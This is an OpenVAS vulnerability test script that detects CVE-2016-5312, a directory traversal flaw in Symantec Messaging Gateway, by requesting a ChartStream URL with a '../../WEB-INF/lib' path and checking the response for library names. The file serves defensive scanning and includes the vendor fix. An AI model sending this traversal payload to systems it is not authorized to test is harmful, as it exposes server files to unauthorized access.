###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_messaging_gateway_dir_trav_sym16_016.nasl 11961 2018-10-18 10:49:40Z asteins $
#
# Symantec Messaging Gateway Directory Traversal Vulnerability (SYM16-016)
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:symantec:messaging_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807891");
  script_version("$Revision: 11961 $");
  script_cve_id("CVE-2016-5312");
  script_bugtraq_id(93148);
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:49:40 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-09-30 10:38:42 +0530 (Fri, 30 Sep 2016)");

  script_name("Symantec Messaging Gateway Directory Traversal Vulnerability (SYM16-016)");

  script_tag(name:"summary", value:"The host is running Symantec Messaging Gateway
  and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request
  and check whether it is able to read files.");

  script_tag(name:"insight", value:"The flaw exists due to error in the charting
  component in the Symantec Messaging Gateway which does not properly sanitize user
  input submitted for charting requests.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to
  access to some files/directories on the server for which the user is not authorized.");

  script_tag(name:"affected", value:"Symantec Messaging Gateway prior to 10.6.2");

  script_tag(name:"solution", value:"Upgrade to Symantec Messaging Gateway 10.6.2
  or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&amp;pvid=security_advisory&amp;year=&amp;suid=20160927_00");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_messaging_gateway_detect.nasl");
  script_mandatory_keys("symantec_smg/detected");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!sgPort = get_app_port(cpe: CPE, service: "www"))
  exit(0);

url = "/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=../../WEB-INF/lib";

if(http_vuln_check(port:sgPort, url:url,  pattern:"sun-mail",
                   extra_check:make_list("rngpack", "apache-mime", "vontu-detection"), check_header:TRUE))
{
  report = report_vuln_url(port:sgPort, url:url);
  security_message(port:sgPort, data:report);
  exit(0);
}

exit(99);
